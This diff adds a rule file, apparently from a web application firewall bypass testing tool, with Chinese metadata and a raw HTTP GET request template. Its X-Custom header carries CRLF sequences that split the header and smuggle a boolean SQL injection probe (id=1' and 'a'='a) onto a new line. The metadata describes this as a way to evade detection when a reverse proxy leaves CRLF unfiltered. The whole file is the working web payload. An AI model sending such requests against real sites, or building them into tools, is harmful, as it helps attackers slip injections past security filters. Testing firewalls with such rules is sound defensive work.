@@ -1,0 +1,14 @@
+# @name: 头部CRLF注入拆分
+# @tags: get,sqli,header,crlf,smuggling,id,bypass
+# @color: rose
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: header_crlf_injection
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 头部值中注入 CRLF(\r\n) 实现头拆分，把 payload 注入到新行/新头，绕过对原始头与请求体的检测（依赖反代未过滤 CRLF）。规则文件内 \r\n 在发送前还原为真实字节。
+GET / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+X-Custom: 1\r\n\r\nid=1'+and+'a'='a
+
